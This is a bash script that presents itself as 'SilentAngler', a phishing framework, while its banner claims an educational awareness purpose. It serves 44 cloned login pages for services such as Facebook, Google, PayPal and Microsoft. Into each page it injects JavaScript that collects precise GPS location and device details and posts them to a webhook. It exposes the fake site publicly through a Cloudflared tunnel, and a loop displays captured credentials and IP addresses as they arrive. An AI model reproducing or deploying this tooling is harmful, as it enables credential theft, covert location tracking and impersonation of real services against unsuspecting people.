#!/bin/bash
# SilentAngler v1.0 - Advanced Phishing Framework
# Author: codeuser143

trap 'printf "\n";stop' 2

banner() {
clear
printf '\e[1;90m'   # Dark Gray (Outer Border)
printf '    ░▒▓████████████████████████████████████████████████████████████████████████▓▒░\n'

printf '\e[1;32m'   # Red (SILENT)
printf '    ██                                                                  ██\n'
printf '    ██   ███████╗██╗██╗     ███████╗███╗   ██╗████████╗                ██\n'
printf '    ██   ██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝                ██\n'
printf '    ██   ███████╗██║██║     █████╗  ██╔██╗ ██║   ██║                   ██\n'
printf '    ██   ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║                   ██\n'
printf '    ██   ███████║██║███████╗███████╗██║ ╚████║   ██║                   ██\n'
printf '    ██   ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝                   ██\n'

printf '\e[1;36m'   # Magenta (ANGLER)
printf '    ██                                                                  ██\n'
printf '    ██    █████╗ ███╗   ██╗ ██████╗ ██╗     ███████╗██████╗            ██\n'
printf '    ██   ██╔══██╗████╗  ██║██╔════╝ ██║     ██╔════╝██╔══██╗           ██\n'
printf '    ██   ███████║██╔██╗ ██║██║  ███╗██║     █████╗  ██████╔╝           ██\n'
printf '    ██   ██╔══██║██║╚██╗██║██║   ██║██║     ██╔══╝  ██╔══██╗           ██\n'
printf '    ██   ██║  ██║██║ ╚████║╚██████╔╝███████╗███████╗██║  ██║           ██\n'
printf '    ██   ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝           ██\n'

printf '\e[1;32m'   # Green (Title Line)
printf '    ██   ░▒▓█ SilentAngler v1.0 - Phishing Awareness Framework █▓▒░     ██\n'

printf '\e[1;36m'   # Cyan (Author & Type)
printf '    ██                                                                  ██\n'
printf '    ██   ➜ Author: codeuser143                                         ██\n'
printf '    ██   ➜ Type: Security Awareness / Simulation                      ██\n'

printf '\e[1;93m'   # Bright Yellow (Warning Box)
printf '    ██   ╔════════════════════════════════════════════════════════╗      ██\n'
printf '    ██   ║  ⚠ For authorized educational use only.               ║      ██\n'
printf '    ██   ╚════════════════════════════════════════════════════════╝      ██\n'

printf '\e[1;31m'   # Red (Bottom Border)
printf '    ██                                                                  ██\n'
printf '    ░▒▓████████████████████████████████████████████████████████████████████████▓▒░\n'

printf '\e[0m'      # Reset
printf '\n'
}

WORKDIR="serve"

dependencies() {
php_path=$(command -v php 2>/dev/null)
command -v php > /dev/null 2>&1 || { echo >&2 "\e[1;31m[✗] PHP is not installed. Install it first.\e[0m"; exit 1; }
if [[ -n "$php_path" && -x "$php_path" ]]; then
    if file "$php_path" 2>/dev/null | grep -q -E 'PE32|MS-DOS'; then
        echo >&2 "\e[1;31m[✗] Detected Windows PHP under WSL. Install native Linux PHP in WSL first.\e[0m"
        echo >&2 "\e[1;93m[!] Run: sudo apt update && sudo apt install php-cli\e[0m"
        exit 1
    fi
fi
command -v wget > /dev/null 2>&1 || { echo >&2 "\e[1;31m[✗] wget is not installed. Install it first.\e[0m"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "\e[1;31m[✗] unzip is not installed. Install it first.\e[0m"; exit 1; }
}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
printf "\e[1;93m[!] Services terminated. Exiting...\e[0m\n"
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' "$WORKDIR/ip.txt" | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;92m[\e[0m+\e[1;92m] IP Address: \e[1;77m%s\e[0m\n" $ip
cat "$WORKDIR/ip.txt" >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for target connection... \e[1;91m[Ctrl+C to exit]\e[0m\n"
if [[ ! -f "$WORKDIR/usernames.txt" ]]; then
    mkdir -p "$WORKDIR"
    touch "$WORKDIR/usernames.txt"
fi
last_creds_lines=$(wc -l < "$WORKDIR/usernames.txt" 2>/dev/null || echo 0)
while [ true ]; do
    if [[ -f "$WORKDIR/usernames.txt" ]]; then
        current_count=$(wc -l < "$WORKDIR/usernames.txt" 2>/dev/null || echo 0)
        if [[ $current_count -gt $last_creds_lines ]]; then
            new_count=$((current_count - last_creds_lines))
            printf "\n\e[1;93m[+] New credentials captured:\e[0m\n"
            tail -n "$new_count" "$WORKDIR/usernames.txt"
            last_creds_lines=$current_count
        fi
    fi
    if [[ -e "$WORKDIR/ip.txt" ]]; then
        printf "\n\e[1;92m[\e[0m+\e[1;92m] Target connected! Harvesting data...\e[0m\n"
        catch_ip
        rm -rf "$WORKDIR/ip.txt"
        printf "\e[1;93m[+] Data saved to: targetreport.txt\e[0m\n"
        if [[ -f "$WORKDIR/data.txt" ]]; then
            printf "\n\e[1;96m[+] Recent webhook data:\e[0m\n"
            tail -n 110 "$WORKDIR/data.txt"
        fi
    fi
    sleep 0.5
done 
}

prepare_template() {
template_choice=$1
template_name=""

case $template_choice in
    1) template_name="adobe" ;;
    2) template_name="badoo" ;;
    3) template_name="deviantart" ;;
    4) template_name="discord" ;;
    5) template_name="dropbox" ;;
    6) template_name="ebay" ;;
    7) template_name="facebook" ;;
    8) template_name="fb_advanced" ;;
    9) template_name="fb_messenger" ;;
    10) template_name="fb_security" ;;
    11) template_name="github" ;;
    12) template_name="gitlab" ;;
    13) template_name="google" ;;
    14) template_name="google_new" ;;
    15) template_name="google_poll" ;;
    16) template_name="ig_followers" ;;
    17) template_name="ig_verify" ;;
    18) template_name="instagram" ;;
    19) template_name="insta_followers" ;;
    20) template_name="linkedin" ;;
    21) template_name="mediafire" ;;
    22) template_name="microsoft" ;;
    23) template_name="netflix" ;;
    24) template_name="origin" ;;
    25) template_name="paypal" ;;
    26) template_name="pinterest" ;;
    27) template_name="playstation" ;;
    28) template_name="protonmail" ;;
    29) template_name="quora" ;;
    30) template_name="reddit" ;;
    31) template_name="roblox" ;;
    32) template_name="snapchat" ;;
    33) template_name="spotify" ;;
    34) template_name="stackoverflow" ;;
    35) template_name="steam" ;;
    36) template_name="tiktok" ;;
    37) template_name="twitch" ;;
    38) template_name="twitter" ;;
    39) template_name="vk" ;;
    40) template_name="vk_poll" ;;
    41) template_name="wordpress" ;;
    42) template_name="xbox" ;;
    43) template_name="yahoo" ;;
    44) template_name="yandex" ;;
    *) template_name="facebook" ;;
esac

if [[ -d "templates/$template_name" ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Selected template: \e[1;96m%s\e[0m\n" "$template_name"
# Prepare a clean serving directory
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"
cp -r "templates/$template_name"/. "$WORKDIR"/ 2>/dev/null
cp -f webhook.php ip.php "$WORKDIR"/ 2>/dev/null || true
# Remove stale empty root index.html before serving, to avoid blank pages
if [[ -f "$WORKDIR/index.html" && ! -s "$WORKDIR/index.html" && -f "$WORKDIR/index.php" ]]; then
    rm -f "$WORKDIR/index.html"
fi
# Inject GPS payload into all HTML pages present in the template
for page in "$WORKDIR"/*.html; do
    if [[ -f "$page" ]]; then
        inject_gps_payload "$page"
    fi
done
# Create a landing redirect if the template uses a login page but no index page exists
if [[ ! -f "$WORKDIR/index.html" && ! -f "$WORKDIR/index.php" ]]; then
    target_page=""
    if [[ -f "$WORKDIR/login.html" ]]; then
        target_page="login.html"
    elif [[ -f "$WORKDIR/login2.html" ]]; then
        target_page="login2.html"
    elif [[ -f "$WORKDIR/mobile.html" ]]; then
        target_page="mobile.html"
    elif [[ -f "$WORKDIR/prefetch.html" ]]; then
        target_page="prefetch.html"
    fi
    if [[ -n "$target_page" ]]; then
        cat > "$WORKDIR/index.php" <<'EOF'
<?php
include 'ip.php';
header('Location: $target_page');
exit;
?>
EOF
    fi
fi
else
printf "\e[1;31m[!] Template '%s' not found! Using default.\e[0m\n" "$template_name"
fi
}

inject_gps_payload() {
file="$1"
if [[ ! -f "$file" ]]; then
    printf "\e[1;31m[!] File not found: %s\e[0m\n" "$file"
    return 1
fi
py_cmd=""
if command -v python3 >/dev/null 2>&1; then
    py_cmd=python3
elif command -v python >/dev/null 2>&1; then
    py_cmd=python
fi
if [[ -n "$py_cmd" ]]; then
    "$py_cmd" - "$file" <<'PYTHON'
import sys
from pathlib import Path
path = Path(sys.argv[1])
script = '''<script>
// Enhanced GPS Location Harvesting
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError, {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        });
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}

function showPosition(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var accuracy = position.coords.accuracy;
    var alt = position.coords.altitude;
    var speed = position.coords.speed;
    var heading = position.coords.heading;
    var deviceInfo = {
        latitude: lat,
        longitude: lon,
        accuracy: accuracy,
        altitude: alt,
        speed: speed,
        heading: heading,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        deviceMemory: navigator.deviceMemory || "unknown",
        connection: navigator.connection ? navigator.connection.effectiveType : "unknown"
    };
    debugLog("Location captured: " + lat + ", " + lon);
    debugLog("Sending webhook to " + window.location.origin + "/webhook.php");
    var xhr = new XMLHttpRequest();
    xhr.open("POST", window.location.origin + "/webhook.php", true);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.onload = function() {
        debugLog("Webhook response: " + this.status + " " + this.responseText);
    };
    xhr.onerror = function() {
        debugLog("Webhook request failed");
    };
    xhr.send(JSON.stringify(deviceInfo));
}

function debugLog(message) {
    console.log(message);
    try {
        var debugEl = document.getElementById('locatex-debug');
        if (!debugEl) {
            debugEl = document.createElement('div');
            debugEl.id = 'locatex-debug';
            debugEl.style.position = 'fixed';
            debugEl.style.bottom = '0';
            debugEl.style.left = '0';
            debugEl.style.width = '100%';
            debugEl.style.maxHeight = '160px';
            debugEl.style.overflowY = 'auto';
            debugEl.style.background = 'rgba(0,0,0,0.75)';
            debugEl.style.color = '#fff';
            debugEl.style.fontSize = '12px';
            debugEl.style.zIndex = '99999';
            debugEl.style.padding = '8px';
            debugEl.style.fontFamily = 'monospace';
            document.body.appendChild(debugEl);
        }
        debugEl.innerText += message + '\n';
    } catch (e) {
        console.log('Debug log error:', e);
    }
}

function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            console.log("User denied the request for Geolocation.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.log("Location information is unavailable.");
            break;
        case error.TIMEOUT:
            console.log("The request to get user location timed out.");
            break;
        case error.UNKNOWN_ERROR:
            console.log("An unknown error occurred.");
            break;
    }
}

document.addEventListener("DOMContentLoaded", function() {
    setTimeout(getLocation, 2000);
});

document.addEventListener("click", function() {
    getLocation();
});
</script>'''

path = Path(sys.argv[1])
data = path.read_text(encoding='utf-8', errors='ignore')
if '</body>' in data:
    data = data.replace('</body>', script + '\n</body>', 1)
    path.write_text(data, encoding='utf-8')
    sys.exit(0)
else:
    sys.exit(1)
PYTHON
    if [[ $? -eq 0 ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] GPS payload injected into %s\e[0m\n" "$file"
    else
        printf "\e[1;31m[!] Could not inject payload into %s\e[0m\n" "$file"
    fi
else
    if sed -i "s|</body>|<script>console.log('GPS script injection fallback');</script>\n</body>|" "$file" 2>/dev/null; then
        printf "\e[1;92m[\e[0m+\e[1;92m] GPS payload injected into %s (fallback)\e[0m\n" "$file"
    else
        printf "\e[1;31m[!] Could not inject payload into %s\e[0m\n" "$file"
    fi
fi
}

cf_server() {
# Check if cloudflared exists and is executable
if [[ -s cloudflared && -x cloudflared ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared found.\e[0m\n"
else
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
    rm -f cloudflared
    arch=$(uname -m)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    
    # Determine architecture
    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
    elif [[ "$arch" == *'aarch64'* ]]; then
        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    elif [[ "$arch" == *'x86_64'* ]]; then
        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    else
        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
    fi
    
    printf "\e[1;93m[+] Downloading from: %s\e[0m\n" "$url"
    wget --no-check-certificate --show-progress "$url" -O cloudflared
    
    if [[ $? -ne 0 || ! -s cloudflared ]]; then
        printf "\e[1;31m[!] Failed to download Cloudflared.\e[0m\n"
        printf "\e[1;93m[+] Trying alternative download method...\e[0m\n"
        
        if command -v curl > /dev/null 2>&1; then
            curl -L "$url" -o cloudflared
            if [[ $? -ne 0 || ! -s cloudflared ]]; then
                printf "\e[1;31m[!] Download failed with curl too.\e[0m\n"
                printf "\e[1;93m[+] Switching to local server...\e[0m\n"
                local_server
                return
            fi
        else
            printf "\e[1;31m[!] Please check your network connection or download Cloudflared manually.\e[0m\n"
            printf "\e[1;93m[+] Switching to local server...\e[0m\n"
            local_server
            return
        fi
    fi
fi

chmod +x cloudflared
pkill -f cloudflared 2>/dev/null || true

printf "\e[1;92m[\e[0m+\e[1;92m] Launching PHP server on port 3333...\e[0m\n"
php -S 127.0.0.1:3333 -t "$WORKDIR" > /dev/null 2>&1 &
sleep 2

printf "\e[1;92m[\e[0m+\e[1;92m] Establishing Cloudflared tunnel...\e[0m\n"
rm -f cf.log > /dev/null 2>&1

# Run cloudflared in background and capture output to log
./cloudflared tunnel --url http://127.0.0.1:3333 --logfile cf.log --no-autoupdate > /dev/null 2>&1 &
CLOUDFLARED_PID=$!

printf "\e[1;93m[+] Waiting for tunnel to establish (up to 60 seconds)...\e[0m\n"
link=""
elapsed=0
max_wait=60

while [[ -z "$link" && $elapsed -lt $max_wait ]]; do
    sleep 2
    elapsed=$((elapsed + 2))
    
    if [[ -f "cf.log" ]]; then
        # NEW: Extract link from JSON log
        link=$(grep -o '"url":"https://[^"]*\.trycloudflare\.com"' cf.log 2>/dev/null | sed 's/"url":"//;s/"//' | head -n1)
        
        # Fallback to old patterns
        if [[ -z "$link" ]]; then
            link=$(grep -Eo 'https://[A-Za-z0-9.-]+\.trycloudflare\.com' "cf.log" | head -n1 2>/dev/null)
        fi
        if [[ -z "$link" ]]; then
            link=$(grep -Eo 'https://[a-z0-9-]+\.trycloudflare\.com' "cf.log" | head -n1 2>/dev/null)
        fi
    fi
    
    # Show progress
    if [[ $((elapsed % 6)) -eq 0 ]]; then
        printf "\e[1;90m[.] Still waiting... (%ds)\e[0m\n" $elapsed
    fi
done

if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Failed to generate tunnel link after %d seconds.\e[0m\n" $max_wait
    
    # Show the full log so you can see the link manually
    printf "\e[1;93m[+] Full cloudflared log:\e[0m\n"
    cat cf.log
    
    printf "\e[1;93m[+] Switching to local server on port 8080.\e[0m\n"
    kill $CLOUDFLARED_PID 2>/dev/null || true
    local_server
    return
else
    printf "\e[1;92m[\e[0m*\e[1;92m] ✅ Tunnel Active! Send this link:\e[0m\n"
    printf "\e[1;96m┌────────────────────────────────────────────────────────────┐\e[0m\n"
    printf "\e[1;77m│  %s  │\e[0m\n" "$link"
    printf "\e[1;96m└────────────────────────────────────────────────────────────┘\e[0m\n"
    
    # Save link to file
    echo "$link" > link.txt
    printf "\e[1;92m[+] Link saved to: link.txt\e[0m\n"
    
    # =============================================
    # COPY BUTTON FEATURE
    # =============================================
    printf "\n\e[1;93m[+] Copy link to clipboard? [Y/n]: \e[0m"
    read -p "" copy_choice
    if [[ $copy_choice == "Y" || $copy_choice == "y" || $copy_choice == "Yes" || $copy_choice == "yes" || -z "$copy_choice" ]]; then
        # Try different clipboard tools
        if command -v xclip > /dev/null 2>&1; then
            echo -n "$link" | xclip -selection clipboard
            printf "\e[1;92m[✓] Link copied to clipboard (xclip)\e[0m\n"
        elif command -v xsel > /dev/null 2>&1; then
            echo -n "$link" | xsel --clipboard --input
            printf "\e[1;92m[✓] Link copied to clipboard (xsel)\e[0m\n"
        elif command -v clip.exe > /dev/null 2>&1; then
            echo -n "$link" | clip.exe
            printf "\e[1;92m[✓] Link copied to clipboard (Windows clip.exe)\e[0m\n"
        elif command -v pbcopy > /dev/null 2>&1; then
            echo -n "$link" | pbcopy
            printf "\e[1;92m[✓] Link copied to clipboard (macOS pbcopy)\e[0m\n"
        else
            printf "\e[1;31m[!] No clipboard tool found. Copy manually from above.\e[0m\n"
        fi
    else
        printf "\e[1;93m[+] OK. Copy manually from above.\e[0m\n"
    fi
    
    # =============================================
    # OPEN IN BROWSER FEATURE
    # =============================================
    printf "\n\e[1;93m[+] Open link in browser? [Y/n]: \e[0m"
    read -p "" open_choice
    if [[ $open_choice == "Y" || $open_choice == "y" || $open_choice == "Yes" || $open_choice == "yes" || -z "$open_choice" ]]; then
        if command -v xdg-open > /dev/null 2>&1; then
            xdg-open "$link"
            printf "\e[1;92m[✓] Link opened in browser\e[0m\n"
        elif command -v open > /dev/null 2>&1; then
            open "$link"
            printf "\e[1;92m[✓] Link opened in browser\e[0m\n"
        elif command -v start > /dev/null 2>&1; then
            start "$link"
            printf "\e[1;92m[✓] Link opened in browser\e[0m\n"
        else
            printf "\e[1;31m[!] Could not open browser automatically.\e[0m\n"
        fi
    fi
fi

# Ensure the template root page is valid
if [[ -f "$WORKDIR/login.html" ]]; then
    cat > "$WORKDIR/index.php" <<'EOF'
<?php
include 'ip.php';
header('Location: login.html');
exit;
?>
EOF
fi

checkfound
}

local_server() {
if [[ -f "$WORKDIR/login.html" ]]; then
    if [[ ! -f "$WORKDIR/index.php" ]] || grep -q -E 'forwarding_link|Location: /index\.html' "$WORKDIR/index.php" 2>/dev/null; then
        cat > "$WORKDIR/index.php" <<'EOF'
<?php
header('Location: login.html');
exit;
?>
EOF
    fi
fi
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on Localhost:8080...\e[0m\n"
printf "\e[1;96m┌────────────────────────────────────────────────────────────┐\e[0m\n"
printf "\e[1;77m│  http://localhost:8080                                     │\e[0m\n"
printf "\e[1;96m└────────────────────────────────────────────────────────────┘\e[0m\n"
php -S 127.0.0.1:8080 -t "$WORKDIR" > /dev/null 2>&1 & 
sleep 2
checkfound
}

template_menu() {
printf "\e[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
printf "\e[1;92m            📁 SELECT PHISHING TEMPLATE\e[0m\n"
printf "\e[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
printf "\e[1;96m[ 1] Adobe      [ 2] Badoo      [ 3] DeviantArt [ 4] Discord\e[0m\n"
printf "\e[1;96m[ 5] Dropbox    [ 6] eBay       [ 7] Facebook   [ 8] FB Adv\e[0m\n"
printf "\e[1;96m[ 9] FB Msgr    [10] FB Sec     [11] GitHub     [12] GitLab\e[0m\n"
printf "\e[1;96m[13] Google     [14] Google New [15] Google Poll[16] IG Followers\e[0m\n"
printf "\e[1;96m[17] IG Verify  [18] Instagram  [19] Insta Fol  [20] LinkedIn\e[0m\n"
printf "\e[1;96m[21] Mediafire  [22] Microsoft  [23] Netflix    [24] Origin\e[0m\n"
printf "\e[1;96m[25] PayPal     [26] Pinterest  [27] PlayStation[28] Protonmail\e[0m\n"
printf "\e[1;96m[29] Quora      [30] Reddit     [31] Roblox     [32] Snapchat\e[0m\n"
printf "\e[1;96m[33] Spotify    [34] StackOver  [35] Steam      [36] TikTok\e[0m\n"
printf "\e[1;96m[37] Twitch     [38] Twitter    [39] VK         [40] VK Poll\e[0m\n"
printf "\e[1;96m[41] WordPress  [42] Xbox       [43] Yahoo      [44] Yandex\e[0m\n"
printf "\e[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
read -p $'\e[1;77m┌─[Select template (1-44)]: \e[0m' template_choice
prepare_template $template_choice
}

locatex() {
if [[ -e "$WORKDIR/data.txt" ]]; then
cat "$WORKDIR/data.txt" >> targetreport.txt
rm -f "$WORKDIR/data.txt"
touch "$WORKDIR/data.txt"
fi
if [[ -e "$WORKDIR/ip.txt" ]]; then
rm -f "$WORKDIR/ip.txt"
fi

# Check if template folder exists
if [[ ! -d "templates" ]]; then
printf "\e[1;31m[!] Template directory not found!\e[0m\n"
printf "\e[1;93m[+] Please ensure template folders are in the current directory under templates/.\e[0m\n"
exit 1
fi

# Show template selection
template_menu

default_option_server="Y"
printf "\n"
read -p $'\e[1;93m[?] Use Cloudflared tunnel? [Y/n]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
cf_server
else
local_server
fi
}

# =============================================
# Main Execution
# =============================================
banner
dependencies
locatex
